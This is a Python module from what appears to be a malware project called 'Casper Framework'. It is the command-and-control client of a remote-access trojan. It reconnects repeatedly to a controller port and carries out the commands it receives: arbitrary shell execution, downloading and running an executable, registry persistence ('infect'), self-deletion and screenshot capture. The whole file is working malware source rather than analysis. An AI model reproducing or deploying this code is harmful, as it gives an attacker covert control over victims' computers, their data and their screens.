"""
Part of Casper Framework
"""
from includes import *

def socket_create():
	global socket_server

	try:
		socket_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		return True
	except socket.error as e:
		logging.debug("[casper] Unable to setup socket >> {}".format(e))

def socket_test():
	test_host = "google.com"
	test_port = 80

	logging.debug("[casper] Testing our connection on {}:{}, please wait!".format(test_host,test_port))
	if (socket_create() == True):
		try:
			socket_server.connect((test_host,test_port))
			logging.debug("[casper] Connection seems alright!")
			return True
		except Exception as e:
			logging.debug("[casper] Unable to connect >> {}".format(e))
		socket_server.close()

def socket_control():
	host = "127.0.0.1"
	port = 4445
	buffer = 1048576
	
	if (socket_test() == True):
		while True:
			if (socket_create() == True):
				try:
					logging.debug("[casper] Connecting to {}:{}".format(host,port))
					socket_server.connect((host,port))
					logging.debug("[casper] Connection established!")
					while True:
						data = decode(socket_server.recv(buffer))
						if (data.split()[0] == "shell"):
							#
							# ToDo: Rewrite shell execute function since we have no error handling at the moment
							#
							socket_server.send(encode(execute(data.split()[1])))
						elif (data.split()[0] == "quit"):
							socket_server.send(encode("\nExiting/shutting down server\n"))
							socket_server.close()
							sys.exit()
						elif (data.split()[0] == "download"):
							if (download_execute(data.split()[1],"tmp.exe",1) == True):
								socket_server.send(encode("\nDownload and execute finished\n"))
							else:
								socket_server.send(encode("\nError while downloading and execute\n"))						
						elif (data.split()[0] == "infect"):
							if (infect() == True):
								socket_server.send(encode("\nRegistry infection finished\n"))
							else:
								socket_server.send(encode("\nError during registry infection\n"))
						elif (data.split()[0] == "removal"):
							if (removal() == True):
								socket_server.send(encode("\nSuccessfully deleted myself\n"))
							else:
								socket_server.send(encode("\nError during deletion of myself\n"))
						elif (data.split()[0] == "screenshot"):
							#
							# ToDo: Rewrite screenshot function since we have no error handling at the moment
							#
							socket_server.send(encode(screenshot()))
						else:
							pass
				except Exception as e:
					logging.debug("[casper] Unable to connect >> {}".format(e))
			else:
				logging.debug("[casper] Unable to setup socket!")
			
			logging.debug("[casper] Closing socket")
			socket_server.close()
			
			logging.debug("[casper] Idling a while")
			time.sleep(random.randint(1,5))
	else:
		logging.debug("[casper] Quiting...")
		sys.exit()
